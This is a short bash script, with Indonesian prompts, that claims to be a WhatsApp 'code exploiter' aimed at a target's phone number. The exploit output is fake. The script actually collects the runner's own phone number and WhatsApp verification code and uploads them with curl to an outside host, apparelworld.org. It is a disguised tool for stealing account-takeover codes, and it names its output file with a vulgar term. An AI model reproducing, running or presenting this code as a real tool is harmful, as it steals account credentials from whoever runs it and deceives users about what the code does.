#!/bin/bash
clear
echo "
<-- IndoSec -->
####################
#   Whatsapp Code  # By .Nicoleus F Sitorus
#     Exploiter    # Adysitorusa7@gmail.com
####################

Copyright (c) 2019 HORAS BANG";
echo "";
read -p "Nomer Kamu (+62xxxx)=> " nomer lae;
read -p "Nomer Target (+62xxxx) => " target Lae;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer Lae";
sleep 0.5
echo "Target => $target Lae";
sleep 0.5
echo "[+] Exploiting Lae...";
echo "Nomer => $nomer" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> kontol.html;
curl -T kontol.html http://apparelworld.org/
sleep 5
echo "[+] Success Exploited!";
exit;
